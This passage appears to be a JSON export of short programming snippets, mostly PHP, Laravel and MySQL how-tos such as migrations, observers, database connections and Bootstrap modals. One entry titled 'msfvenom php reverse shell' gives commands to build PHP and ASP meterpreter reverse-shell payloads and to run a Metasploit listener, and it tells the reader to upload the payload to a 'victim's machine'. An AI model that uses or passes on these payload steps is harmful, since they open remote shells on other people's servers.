    "description": "Schema::table('users', function (Blueprint $table) {     $table->renameColumn('from', 'to'); });\n// To drop a column, use the dropColumn method on the schema builder. // Before dropping columns from a SQLite database, you will need to add // the doctrine/dbal dependency to your composer.json file and run the // composer update command in your terminal to install the library:  Schema::table('users', function (Blueprint $table) {     $table->dropColumn('votes'); });\npublic function down() {     Schema::table('posts', function (Blueprint $table) {         $table->renameColumn('user_id', 'author_ID');     }); } \npublic function up() {     Schema::table('posts', function (Blueprint $table) {         $table->renameColumn('author_ID', 'user_id');     }); } \nphp artisan make:migration rename_author_id_in_posts_table --table=posts \npublic function getDateStartAttribute($value) {     return Carbon::parse($value)->format('Y-m-d\\TH:i'); }  public function getDateEndAttribute($value) {     return Carbon::parse($value)->format('Y-m-d\\TH:i'); } \n",
    "reg_date": "2021-10-12T10:17:05.000Z"
  },
  {
    "id": 2907,
    "keyword": null,
    "link": null,
    "title": " migrations required field laravel",
    "description": "$table->string('foo')->nullable(false)->change();\n",
    "reg_date": "2021-10-12T10:17:05.000Z"
  },
  {
    "id": 2908,
    "keyword": null,
    "link": null,
    "title": " mix is not recognized",
    "description": "npm install laravel-mix@latest --save-dev\nnpm install laravel-mix@latest --save-dev \n",
    "reg_date": "2021-10-12T10:17:05.000Z"
  },
  {
    "id": 2909,
    "keyword": null,
    "link": null,
    "title": " mixed content: the page at was loaded over https, but requested an insecure xmlhttprequest endpoint",
    "description": "Add below code to your index.php file for on the https   if((!empty( $_SERVER['HTTP_X_FORWARDED_HOST'])) || (!empty( $_SERVER['HTTP_X_FORWARDED_FOR'])) ) {  \t$_SERVER['HTTP_HOST'] = $_SERVER['HTTP_X_FORWARDED_HOST'];  \t$_SERVER['HTTPS'] = 'on';  }\n<meta http-equiv=\"Content-Security-Policy\" content=\"upgrade-insecure-requests\">  \n",
    "reg_date": "2021-10-12T10:17:05.000Z"
  },
  {
    "id": 2910,
    "keyword": null,
    "link": null,
    "title": " modal boostrap",
    "description": "<button type=\"button\" class=\"btn btn-primary\" data-toggle=\"modal\" data-target=\"#modalId\">   --- </button>  <div class=\"modal fade\" id=\"modalId\">   <div class=\"modal-dialog\" role=\"document\">     <div class=\"modal-content\">       <div class=\"modal-header\">         <h5 class=\"modal-title\">title</h5> \t\t<button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-label=\"Close\">         \t<span aria-hidden=\"true\">&times;</span>         </button>       </div>       <div class=\"modal-body\">                </div>       <div class=\"modal-footer\">   \t\t<button type=\"button\" class=\"btn btn-secondary\" data-dismiss=\"modal\">Close</button>         <button type=\"submit\" class=\"btn btn-primary\">Save changes</button>       </div>     </div>   </div> </div>\n",
    "reg_date": "2021-10-12T10:17:05.000Z"
  },
  {
    "id": 2911,
    "keyword": null,
    "link": null,
    "title": " modal show not close jquery",
    "description": "$('#myModal').on('hidden.bs.modal', function () {   // do something&hellip; })\njQuery('#modal_ajax').modal('show', {backdrop: 'static', keyboard: false}); \n",
    "reg_date": "2021-10-12T10:17:06.000Z"
  },
  {
    "id": 2912,
    "keyword": null,
    "link": null,
    "title": " model json laravel accessor to convert to array",
    "description": "public function getBalanceAttribute($value) {     return json_decode($value); }\n",
    "reg_date": "2021-10-12T10:17:06.000Z"
  },
  {
    "id": 2913,
    "keyword": null,
    "link": null,
    "title": " model observer laravel",
    "description": "php artisan make:observer nameOfObserver --model=modelName\nphp artisan make:model Flight\nnamespace App;  use Illuminate\\Database\\Eloquent\\Model;  class Post extends Model {     protected $table = 'posts';      protected $fillable = ['title', 'slug', 'content'];      protected static function boot()     {         parent::boot();         static::saving(function ($model) {             $model->slug = str_slug($model->title);         });     } }\n<?php  namespace App\\Observers;  use App\\Models\\User;  class UserObserver {     /**      * Handle the User \"created\" event.      *      * @param  \\App\\Models\\User  $user      * @return void      */     public function created(User $user)     {         //     }      /**      * Handle the User \"updated\" event.      *      * @param  \\App\\Models\\User  $user      * @return void      */     public function updated(User $user)     {         //     }      /**      * Handle the User \"deleted\" event.      *      * @param  \\App\\Models\\User  $user      * @return void      */     public function deleted(User $user)     {         //     }      /**      * Handle the User \"forceDeleted\" event.      *      * @param  \\App\\Models\\User  $user      * @return void      */     public function forceDeleted(User $user)     {         //     } }\n<?php  namespace App\\Observers;  use App\\Models\\Product;  class ProductObserver{      /**     * Handle the Product \"created\" event.     *     * @param  \\App\\Models\\Product  $product     * @return void     */    public function creating(Product $product)    {        $product->slug = \\Str::slug($product->name);    }      /**     * Handle the Product \"created\" event.     *     * @param  \\App\\Models\\Product  $product     * @return void     */    public function created(Product $product)    {        $product->unique_id = 'PR-'.$product->id;        $product->save();    }      /**     * Handle the Product \"updated\" event.     *     * @param  \\App\\Models\\Product  $product     * @return void     */    public function updated(Product $product)    {              }      /**     * Handle the Product \"deleted\" event.     *     * @param  \\App\\Models\\Product  $product     * @return void     */    public function deleted(Product $product)    {              }      /**     * Handle the Product \"restored\" event.     *     * @param  \\App\\Models\\Product  $product     * @return void     */    public function restored(Product $product)    {              }      /**     * Handle the Product \"force deleted\" event.     *     * @param  \\App\\Models\\Product  $product     * @return void     */    public function forceDeleted(Product $product)    {              }}\n<?php  namespace App\\Providers;  use App\\Observers\\UserObserver; use App\\Models\\User; use Illuminate\\Support\\ServiceProvider;  class AppServiceProvider extends ServiceProvider {     /**      * Register any application services.      *      * @return void      */     public function register()     {         //     }      /**      * Bootstrap any application services.      *      * @return void      */     public function boot()     {         User::observe(UserObserver::class);     } }\n",
    "reg_date": "2021-10-12T10:17:06.000Z"
  },
  {
    "id": 2914,
    "keyword": null,
    "link": null,
    "title": " model refresh laravel",
    "description": "$user =new App\\Models\\User()   $user->name = \"ali\"   $user->email = \"ali@gmail.com\"   $user->password = bcrypt(\"123\")   $user->save()      $user->name  = \"mohamad\"   $user->refresh()         echo $user    //output is  {  id: 1,      name: \"ali\",      email: \"ali@gmail.com\",      email_verified_at: null,      password: \"$2y$10$MmcGpLe7bN1FhOqpKZKXr.cxndIhWbn.Libs7JpCNDwhDyb5e5mqe\",      remember_token: null,      created_at: \"2021-07-14 08:06:59\",      updated_at: \"2021-07-14 08:06:59\", } \n",
    "reg_date": "2021-10-12T10:17:06.000Z"
  },
  {
    "id": 2915,
    "keyword": null,
    "link": null,
    "title": " moodle webservice create user phone2",
    "description": "// add to the user/externallib.php the code // inside the function: create_users_parameters ... 'phone2' => new external_value(core_user::get_property_type('phone2'), 'Phone 2', VALUE_OPTIONAL), ...\n",
    "reg_date": "2021-10-12T10:17:06.000Z"
  },
  {
    "id": 2916,
    "keyword": null,
    "link": null,
    "title": " move post to draft php wordpress",
    "description": "$post = array( 'ID' => $post_id, 'post_status' => $status ); wp_update_post($post);\n",
    "reg_date": "2021-10-12T10:17:06.000Z"
  },
  {
    "id": 2917,
    "keyword": null,
    "link": null,
    "title": " move uploaded file",
    "description": "<?php    if (move_uploaded_file($_FILES['userfile']['tmp_name'], \"/documents/new/\")) {       print \"Uploaded successfully!\";    } else {       print \"Upload failed!\";    } ?>\n <?php $uploads_dir = '/uploads'; foreach ($_FILES[\"pictures\"][\"error\"] as $key => $error) {     if ($error == UPLOAD_ERR_OK) {         $tmp_name = $_FILES[\"pictures\"][\"tmp_name\"][$key];         // basename() may prevent filesystem traversal attacks;         // further validation/sanitation of the filename may be appropriate         $name = basename($_FILES[\"pictures\"][\"name\"][$key]);         move_uploaded_file($tmp_name, \"$uploads_dir/$name\");     } } ?>  \nmove_uploaded_file(file_path, moved_path) \n",
    "reg_date": "2021-10-12T10:17:06.000Z"
  },
  {
    "id": 2918,
    "keyword": null,
    "link": null,
    "title": " mpdf margin",
    "description": "<?php $mpdf = new \\Mpdf\\Mpdf([ \t\t\t'mode' => '', \t\t\t'format' => 'A4', \t\t\t'default_font_size' => 0, \t\t\t'default_font' => '', \t\t\t'margin_left' => 15, \t\t\t'margin_right' => 15, \t\t\t'margin_top' => 16, \t\t\t'margin_bottom' => 16, \t\t\t'margin_header' => 9, \t\t\t'margin_footer' => 9, \t\t\t'orientation' => 'P', \t\t]); $mpdf->WriteHTML('Hello World');  // Saves file on the server as 'filename.pdf' $mpdf->Output('filename.pdf', \\Mpdf\\Output\\Destination::FILE); \n",
    "reg_date": "2021-10-12T10:17:06.000Z"
  },
  {
    "id": 2919,
    "keyword": null,
    "link": null,
    "title": " msfvenom php reverse shell",
    "description": "##This will create the payload file \"shell.php\" with your ip and port. msfvenom -p php/meterpreter/reverse_tcp LHOST=<$LOCAL_IP> LPORT=<$LOCAL_PORT> -f raw -o shell.php ##You can always \"nano\" the file to change your ipaddr and port incase you messed up the first step. #Run 'msfconsole' to start the listener then run the following command. use exploit/multi/handler  set PAYLOAD php/meterpreter/reverse_tcp #set your ipaddr set LHOST <$LOCAL_IP> #set your listening port set LPORT <$LOCAL_PORT> #\"show options\" to check ur steps then run the command \"exploit\" exploit #this will start the listener #Upload \"shell.php\" to your victim's machine. #The victim's machine will need to run the file to connect back to your machine.\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp\n",
    "reg_date": "2021-10-12T10:17:06.000Z"
  },
  {
    "id": 2920,
    "keyword": null,
    "link": null,
    "title": " mt rand",
    "description": "// mt_rand &mdash; Generate a random value via the Mersenne Twister Random Number Generator  mt_rand(1, 10); // generates a random number of 1 to 10;\n",
    "reg_date": "2021-10-12T10:17:06.000Z"
  },
  {
    "id": 2921,
    "keyword": null,
    "link": null,
    "title": " multi catch for try php",
    "description": "<?php try {     /* ... */ } catch (FirstException $ex) {     $this->manageException($ex); } catch (SecondException $ex) {     $this->manageException($ex); } ?>    <------------------------- To --------------------->    <?php try {  } catch (FirstException | SecondException $ex) {     $this->manageException($ex); } ?>\ntry {     // Some code... } catch(AError | BError $e) {     // Handle exceptions } catch(Exception $e) {     // Handle the general case }\n",
    "reg_date": "2021-10-12T10:17:07.000Z"
  },
  {
    "id": 2922,
    "keyword": null,
    "link": null,
    "title": " multi lang in php",
    "description": "<?php $trans = [     'en' => [         'user_where_are_you_text' => 'Where are You, %s? It is me, %s! I am waiting here for %s hours!',         //...     ],     'fr' => [         'user_where_are_you_text' => 'O&ugrave; es-tu, %s? C\\'est moi, %s! J\\'attends ici depuis %s heures!'         //...     ],     //... ];  $name = 'Loz'; $name1 = 'Rasmus'; $time = 3;  function __($key, ...$arguments) {     global $trans, $lang;     return sprintf($trans[$lang][$key], ...$arguments); }  // $lang = 'en'; echo __('user_where_are_you_text', $name, $name1, $time).PHP_EOL;  // $lang = 'fr'; echo __('user_where_are_you_text', $name, $name1, $time).PHP_EOL;\n",
    "reg_date": "2021-10-12T10:17:07.000Z"
  },
  {
    "id": 2923,
    "keyword": null,
    "link": null,
    "title": " multi lang php",
    "description": "<?php $trans = [     'en' => [         'user_where_are_you_text' => 'Where are You, %s? It is me, %s! I am waiting here for %s hours!',         //...     ],     'fr' => [         'user_where_are_you_text' => 'O&ugrave; es-tu, %s? C\\'est moi, %s! J\\'attends ici depuis %s heures!'         //...     ],     //... ];  $name = 'Loz'; $name1 = 'Rasmus'; $time = 3;  function __($key, ...$arguments) {     global $trans, $lang;     return sprintf($trans[$lang][$key], ...$arguments); }  // $lang = 'en'; echo __('user_where_are_you_text', $name, $name1, $time).PHP_EOL;  // $lang = 'fr'; echo __('user_where_are_you_text', $name, $name1, $time).PHP_EOL;\n",
    "reg_date": "2021-10-12T10:17:07.000Z"
  },
  {
    "id": 2924,
    "keyword": null,
    "link": null,
    "title": " multi line comment in php",
    "description": "<?php /* This is a multiple-lines comment block that spans over multiple lines */ ?>   \n<?php // Author : https://www.codedweb.org/ // This is a single-line comment # This is also a single-line comment in unix and linux    /* This is a Multi-lines comment block by this way you can add muliple lines on it.  lines */    // You can also use comments to leave out parts of a code line $var = 2 /* + 12 */ + 2; echo $var; ?>\n<?php // This is a single-line comment  # This is also a single-line comment    /* This is a multiple-lines comment block that spans over multiple lines */    // You can also use comments to leave out parts of a code line $x = 5 /* + 15 */ + 5; echo $x; ?>\n// This is a single-line comment # This is also a single-line comment /* This is a multiple-lines comment block that spans over multiple lines */\n//For a single line comment use //: //this is a comment too //for multi-line comments use /* and */: /* <--start of multi-line comment this is a comment  this is a comment too (end of multi-line comment)-->*/\n/* This is a multiple-lines comment block that spans over multiple lines */\n",
    "reg_date": "2021-10-12T10:17:07.000Z"
  },
  {
    "id": 2925,
    "keyword": null,
    "link": null,
    "title": " multiple comments in php",
    "description": "<?php /* This is a multiple-lines comment block that spans over multiple lines */ ?>   \n/* This is a multiple-lines comment block that spans over multiple lines */\n",
    "reg_date": "2021-10-12T10:17:07.000Z"
  },
  {
    "id": 2926,
    "keyword": null,
    "link": null,
    "title": " multiple delete in codeigniter with checkbox",
    "description": "<?php   /*PHP CONTROLLER*/   defined('BASEPATH') OR exit('No direct script access allowed'); class Item extends CI_Controller {   /**     * Get All Data from this method.     *     * @return Response    */    public function __construct() {         parent::__construct();       $this->load->database();      }     /**     * Get All Data from this method.     *     * @return Response    */   public function index()    {         $data['data'] = $this->db->get(\"items\")->result();          $this->load->view('item', $data);     }     /**     * Get All Data from this method.     *     * @return Response    */     public function deleteAll()    {         $ids = $this->input->post('ids');           $this->db->where_in('id', explode(\",\", $ids));       $this->db->delete('items');          echo json_encode(['success'=>\"Item Deleted successfully.\"]);     } } ?> /*php route file*/   <?php defined('BASEPATH') OR exit('No direct script access allowed');   $route['default_controller'] = 'welcome'; $route['404_override'] = ''; $route['translate_uri_dashes'] = FALSE;   $route['item'] = \"item\"; $route['itemDelete']['post'] = \"item/deleteAll\"; ?>   /*Tables   CREATE TABLE IF NOT EXISTS `items` (   `id` int(10) unsigned NOT NULL AUTO_INCREMENT,   `title` varchar(255) COLLATE utf8_unicode_ci NOT NULL,   `description` text COLLATE utf8_unicode_ci NOT NULL,   PRIMARY KEY (`id`) ) ENGINE=InnoDB  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=16 ; */   /*views   <!DOCTYPE html> <html> <head>     <title>how to delete multiple records using checkbox in codeigniter - itsolutionstuff.com</title>     <link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css\" />     <script src=\"https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js\"></script> </head> <body> <div class=\"container\"> <div class=\"row\">     <div class=\"col-lg-12 margin-tb\">         <div class=\"pull-left\">             <h2>how to delete multiple records using checkbox in codeigniter - itsolutionstuff.com</h2>         </div>     </div> </div>   <button style=\"margin-bottom: 10px\" class=\"btn btn-primary delete_all\" data-url=\"/itemDelete\">Delete All Selected</button>   <table class=\"table table-bordered\" style=\"margin-top:20px\">     <thead>       <tr>           <th width=\"50px\"><input type=\"checkbox\" id=\"master\"></th>           <th>Title</th>           <th>Description</th>       </tr>   </thead>     <tbody>    <?php foreach ($data as $item) { ?>             <tr>           <td><input type=\"checkbox\" class=\"sub_chk\" data-id=\"<?php echo $item->id; ?>\"></td>           <td><?php echo $item->title; ?></td>           <td><?php echo $item->description; ?></td>       </tr>    <?php } ?>   </tbody>   </table> </div>   <script type=\"text/javascript\">     $(document).ready(function () {           $('#master').on('click', function(e) {          if($(this).is(':checked',true))            {             $(\".sub_chk\").prop('checked', true);            } else {               $(\".sub_chk\").prop('checked',false);            }           });           $('.delete_all').on('click', function(e) {               var allVals = [];               $(\".sub_chk:checked\").each(function() {                   allVals.push($(this).attr('data-id'));             });                 if(allVals.length <=0)               {                   alert(\"Please select row.\");               }  else {                     var check = confirm(\"Are you sure you want to delete this row?\");                   if(check == true){                         var join_selected_values = allVals.join(\",\");                        $.ajax({                         url: $(this).data('url'),                         type: 'POST',                         data: 'ids='+join_selected_values,                         success: function (data) {                           console.log(data);                           $(\".sub_chk:checked\").each(function() {                                 $(this).parents(\"tr\").remove();                           });                           alert(\"Item Deleted successfully.\");                         },                         error: function (data) {                             alert(data.responseText);                         }                     });                     $.each(allVals, function( index, value ) {                       $('table tr').filter(\"[data-row-id='\" + value + \"']\").remove();                   });                 }               }           });     }); </script>   </body> </html> */\n",
    "reg_date": "2021-10-12T10:17:07.000Z"
  },
  {
    "id": 2927,
    "keyword": null,
    "link": null,
    "title": " multiple logical condition in laravel query",
    "description": "// ... $q->where(function ($query) {     $query->where('gender', 'Male')         ->where('age', '>=', 18); })->orWhere(function($query) {     $query->where('gender', 'Female')         ->where('age', '>=', 65);\t })\n",
    "reg_date": "2021-10-12T10:17:07.000Z"
  },
  {
    "id": 2928,
    "keyword": null,
    "link": null,
    "title": " multiple middleware laravel",
    "description": "Route::group(['middleware' => ['auth', 'web']], function() {   // uses 'auth' middleware plus all middleware from $middlewareGroups['web']   Route::resource('blog','BlogController'); //Make a CRUD controller });\nRoute::get('/', function () { // })->middleware('first', 'second'); \nRoute::group(['middleware' => 'auth:admin,web'], function () {    Route::resource('blog','BlogController'); //Make a CRUD controller });\nRoute::group(['middleware' => ['auth', 'web']], function() {   // uses 'auth' middleware plus all middleware from $middlewareGroups['web']   Route::resource('blog','BlogController'); //Make a CRUD controller }); \n",
    "reg_date": "2021-10-12T10:17:07.000Z"
  },
  {
    "id": 2929,
    "keyword": null,
    "link": null,
    "title": " multiple orwhere condition in laravel",
    "description": "$query->where([     ['column_1', '=', 'value_1'],     ['column_2', '<>', 'value_2'],     [COLUMN, OPERATOR, VALUE],     ... ])\n  public function index()     {         $search = \"Har\";            $users = User::select(\"*\")->where('status', 1)                   ->where(function($query) use ($search){                    $query->where('first_name', 'LIKE', '%'.$search.'%')                    ->orWhere('last_name', 'LIKE', '%'.$search.'%')                    ->orWhere('email', 'LIKE', '%'.$search.'%');                     })->get();            dd($users);     }  # With Join   public function index()     {         $search = \"Har\";            $users = User::select(\"*\")->where('status', 1)                   ->where(function($query) use ($search){                    $query->where('first_name', 'LIKE', '%'.$search.'%')                    ->orWhere('last_name', 'LIKE', '%'.$search.'%')                    ->orWhere('email', 'LIKE', '%'.$search.'%');                     })           ->join('users_roles', 'users.id', '=', 'users_roles.user_id')           ->where('users_roles.role_id', '=', Role::USER_PARTICIPANT)->get();            dd($users);     }\n// ... $q->where(function ($query) {     $query->where('gender', 'Male')         ->where('age', '>=', 18); })->orWhere(function($query) {     $query->where('gender', 'Female')         ->where('age', '>=', 65);\t })\nif ($request->search) {                    $users = User::where('type', '=',  'Customer')         ->where(function ($query) use ($request) {             $query->where('name', \"like\", \"%\" . $request->search . \"%\");             $query->orWhere('mobile', \"like\", \"%\" . $request->search . \"%\");         })->get();      } \n",
    "reg_date": "2021-10-12T10:17:07.000Z"
  },
  {
    "id": 2930,
    "keyword": null,
    "link": null,
    "title": " multiple routes same controller laravel",
    "description": "$router->get('/{home?}', 'SiteController@home')        ->where('home', '(home|another_home_route)')        ->name('home');\n",
    "reg_date": "2021-10-12T10:17:07.000Z"
  },
  {
    "id": 2931,
    "keyword": null,
    "link": null,
    "title": " multiple submit button in php",
    "description": "<?php     if (isset($_POST['publish'])) {         # Publish-button was clicked     }     elseif (isset($_POST['save'])) {         # Save-button was clicked     } ?> \n",
    "reg_date": "2021-10-12T10:17:07.000Z"
  },
  {
    "id": 2932,
    "keyword": null,
    "link": null,
    "title": " multiply a string php",
    "description": "str_repeat ( string $input , int $multiplier )\n",
    "reg_date": "2021-10-12T10:17:08.000Z"
  },
  {
    "id": 2933,
    "keyword": null,
    "link": null,
    "title": " must be an instance of Illuminate\\\\Http\\\\Request",
    "description": " $objetoRequest = new \\Illuminate\\Http\\Request();  $objetoRequest->setMethod('POST');  $objetoRequest->request->add([  \t'parametro' => 'valor',     'parametro2' => 'valor2'  ]);\n",
    "reg_date": "2021-10-12T10:17:08.000Z"
  },
  {
    "id": 2934,
    "keyword": null,
    "link": null,
    "title": " mySQL phpMyAdmin with Google Chrome: stuck on loading",
    "description": "// Clear cookies in your browser, then refresh or reopen phpMyAdmin in your browser. Restart mysql.\n",
    "reg_date": "2021-10-12T10:17:08.000Z"
  },
  {
    "id": 2935,
    "keyword": null,
    "link": null,
    "title": " my vscode extension prettier doesnot work for php code",
    "description": "my vscode extension prettier doesnot work for php code   \n",
    "reg_date": "2021-10-12T10:17:08.000Z"
  },
  {
    "id": 2936,
    "keyword": null,
    "link": null,
    "title": " mysql connect php",
    "description": "<?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\"; $dbname = \"myDB\";  // Create connection $conn= mysqli_connect($servername,$username,$password,$dbname); // Check connection if (!$conn) {   die(\"Connection failed: \" . mysqli_connect_error()); } echo \"Connected Successfully.\"; ?>\n<?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\";  try {     $conn = new PDO(\"mysql:host=$servername;dbname=myDB\", $username, $password);     // set the PDO error mode to exception     $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);     echo \"Connected successfully\";     } catch(PDOException $e)     {     echo \"Connection failed: \" . $e->getMessage();     } ?>\n$servername = \"localhost\"; $username = \"username\"; $password = \"password\";  // Create connection $conn = new mysqli($servername, $username, $password);  // Check connection if ($conn->connect_error) {     die(\"Connection failed: \" . $conn->connect_error); } echo \"Connected successfully\";   Simplified  $conn = mysqli_connect('localhost', 'username', 'password'); $database = mysqli_select_db($conn, 'database');\n# MySql improved <?php     $mysqli = new mysqli(\"localhost\", \"username\", \"password\", \"dbname\"); \t$result = $mysqli->query(\"SELECT lastname FROM employees\"); ?> # Connection with PDO <?php     $myPDO = new PDO('mysql:host=localhost;dbname=dbname', 'username', 'password'); \t$result = $myPDO->query(\"SELECT lastname FROM employees\"); ?> # With PHP legacy functions: <?php     mysql_connect('localhost','username','password');     mysql_select_db(\"dbname\"); \t$result = mysql_query('SELECT lastname FROM employees'); ?>\nJust include this Temlate in other file using PHP Include/Require Keywords  And Make Connection In One Shot :)  <?php        // echo \"Welcome to Connecting of DB Tutorial!\";     // echo \"<br>\";      // 1. PDO - Php Data Objects     // 2. MySQLi extension      // Set Connection Variable     $server = \"localhost\";     $username = \"root\";     $password = \"\";     $database = \"test\";      // Create A Connection     $con = mysqLi_connect($server, $username, $password, $database);       // Check For Connection      if(!$con){         die (\"Connection Terminated! by Die() function\". mysqLi_connect_error());             }     else {         echo \"Connection Succefully Happened! <br>\";     }       ?>\n<?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\";  // Create connection $conn = new mysqli($servername, $username, $password);  // Check connection if ($conn->connect_error) {     die(\"Connection failed: \" . $conn->connect_error); } echo \"Connected successfully\"; ?>\n",
    "reg_date": "2021-10-12T10:17:08.000Z"
  },
  {
    "id": 2937,
    "keyword": null,
    "link": null,
    "title": " mysql connection phpmyadmin",
    "description": "<?php   // This is for checking if your file is linked in your page or game or whatever   echo \"IT WORKS\"; // My File is successfuly Linked    //Remember to create a Database in phpmyadmin or any Online Database   // the values passed in this parameters are:  the host, the user, user password and the database Name   $con = mysqli_connect('localhost', 'root', 'root', 'unityaccess');    // check that connection happen   if(mysqli_connect_errno()) {     echo \"1: Connection Failed\"; //error code #1 = connection Failed     exit();   } ?> \n",
    "reg_date": "2021-10-12T10:17:08.000Z"
  },
  {
    "id": 2938,
    "keyword": null,
    "link": null,
    "title": " mysql db connection in php",
    "description": "<?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\"; $dbname = \"myDB\";  // Create connection $conn= mysqli_connect($servername,$username,$password,$dbname); // Check connection if (!$conn) {   die(\"Connection failed: \" . mysqli_connect_error()); } echo \"Connected Successfully.\"; ?>\n# MySql improved <?php     $mysqli = new mysqli(\"localhost\", \"username\", \"password\", \"dbname\"); \t$result = $mysqli->query(\"SELECT lastname FROM employees\"); ?> # Connection with PDO <?php     $myPDO = new PDO('mysql:host=localhost;dbname=dbname', 'username', 'password'); \t$result = $myPDO->query(\"SELECT lastname FROM employees\"); ?> # With PHP legacy functions: <?php     mysql_connect('localhost','username','password');     mysql_select_db(\"dbname\"); \t$result = mysql_query('SELECT lastname FROM employees'); ?>\n<?php  $hostName = 'localhost'; $userNmame = 'root'; $password = ''; $dbname = 'topproduct'; $db_name = \"mysql:host=$hostName;dbname=$dbname\"; $conn = new PDO($db_name,$userNmame,$password);  if(!$conn){     echo 'Error database connection';     } \n<?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\";  // Create connection $conn = new mysqli($servername, $username, $password);  // Check connection if ($conn->connect_error) {     die(\"Connection failed: \" . $conn->connect_error); } echo \"Connected successfully\"; ?>\n <?php $mysqli = new mysqli(\"localhost\",\"my_user\",\"my_password\",\"my_db\");  // Check connection if ($mysqli -> connect_errno) {    echo \"Failed to connect to MySQL: \" . $mysqli -> connect_error;      exit();    } ?>\n",
    "reg_date": "2021-10-12T10:17:08.000Z"
  },
  {
    "id": 2939,
    "keyword": null,
    "link": null,
    "title": " mysql default port",
    "description": "mysql -u root mysql> SHOW GLOBAL VARIABLES LIKE 'PORT'; # Default port is 3306 for MySQL\n3306\nThe default port for MySQL server is 3306\nClient - Server Connection Ports Port 3306 is the default port for the classic MySQL protocol \n",
    "reg_date": "2021-10-12T10:17:08.000Z"
  },
  {
    "id": 2940,
    "keyword": null,
    "link": null,
    "title": " mysql fetch array php",
    "description": " <?php mysql_connect(\"localhost\", \"mysql_user\", \"mysql_password\") or die(\"Impossible de se connecter : \" . mysql_error()); mysql_select_db(\"mydb\");  $result = mysql_query(\"SELECT id, name FROM mytable\");  while ($row = mysql_fetch_array($result, MYSQL_NUM)) {    printf(\"ID : %s  Nom : %s\", $row[0], $row[1]); }  mysql_free_result($result); ?>  \n",
    "reg_date": "2021-10-12T10:17:08.000Z"
  },
  {
    "id": 2941,
    "keyword": null,
    "link": null,
    "title": " mysql get the last id php",
    "description": "// Insert query  $query = \"insert into users(username,fname,lname) values('sonarika','Sonarika','Bhadoria')\";   mysqli_query($con,$query);   // Get last insert id  $lastid = mysqli_insert_id($con); \n",
    "reg_date": "2021-10-12T10:17:09.000Z"
  },
  {
    "id": 2942,
    "keyword": null,
    "link": null,
    "title": " mysql get this inserted id php",
    "description": "<?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\"; $dbname = \"myDB\";  // Create connection $conn = mysqli_connect($servername, $username, $password, $dbname); // Check connection if (!$conn) {     die(\"Connection failed: \" . mysqli_connect_error()); }  $sql = \"INSERT INTO MyGuests (firstname, lastname, email) VALUES ('John', 'Doe', 'john@example.com')\";  if (mysqli_query($conn, $sql)) {     $last_id = mysqli_insert_id($conn);     echo \"New record created successfully. Last inserted ID is: \" . $last_id; } else {     echo \"Error: \" . $sql . \"<br>\" . mysqli_error($conn); }  mysqli_close($conn); ?>\n$this_id = mysqli_insert_id($db);\n",
    "reg_date": "2021-10-12T10:17:09.000Z"
  },
  {
    "id": 2943,
    "keyword": null,
    "link": null,
    "title": " mysql num rows",
    "description": "<?php  /* Explination  The mysqli_num_rows() function is an inbuilt function in PHP  which is used to return the number of rows present in the result set.  It is generally used to check if data is present in the database or not.  To use this function, it is mandatory to first set up the connection with the MySQL database. */ \t// Setting up connection with database Geeks  \t$con = mysqli_connect(\"localhost\", \"root\", \"\", \"testing\");  \t \t// Check connection  \tif (mysqli_connect_errno()) {  \t\techo \"Database connection failed.\";  \t}  \t// Fetch Query \t$query = \"SELECT Username, Password FROM users\";  \t \t// Execute the query and store the result set  \t$result = mysqli_query($con, $query);  \t \tif ($result) {  \t\t// it return number of rows in the table.  \t\t$row = mysqli_num_rows($result);  \t\tif ($row) {  \t\t\t \tprintf(\"Number of row in the table : \" . $row);  \t\t\t}  \t\t// close the result.  \t\tmysqli_free_result($result);  \t}   // Output : Number of row in the table : 5 ?>  \n//number of rows retrieved from a query <?php  $link = mysql_connect(\"localhost\", \"mysql_user\", \"mysql_password\"); mysql_select_db(\"database\", $link);  $result = mysql_query(\"SELECT * FROM table1\", $link); $num_rows = mysql_num_rows($result);  echo \"$num_rows Rows\\n\";  ?>  \nSELECT row_number() over ( order by firstName) RowNumberSqeuence,FirstName from rowNumberDemo  order by FirstName;\nSET @row_number = 0;  SELECT      (@row_number:=@row_number + 1) AS num,      firstName,      lastName FROM     employees ORDER BY firstName, lastName     LIMIT 5;\n",
    "reg_date": "2021-10-12T10:17:09.000Z"
  },
  {
    "id": 2944,
    "keyword": null,
    "link": null,
    "title": " mysql replace a character in a string",
    "description": "UPDATE users SET first_name = REPLACE (first_name, 'search', 'replace_with') where id > 0;\nUPDATE     table_name SET     column_name = REPLACE(column_name, 'text to find', 'text to replace with') WHERE     column_name LIKE '%text to find%';\n",
    "reg_date": "2021-10-12T10:17:09.000Z"
  },
  {
    "id": 2945,
    "keyword": null,
    "link": null,
    "title": " mysql timestamp format php",
    "description": "date(\"Y-m-d H:i:s\", strtotime($_POST['timestamp']));\necho date(\"Y-m-d H:i:s\", time());\ndate(\"d.m.Y\", strtotime($mysqltimestamp)\n",
    "reg_date": "2021-10-12T10:17:09.000Z"
  },
  {
    "id": 2946,
    "keyword": null,
    "link": null,
    "title": " mysqli connect",
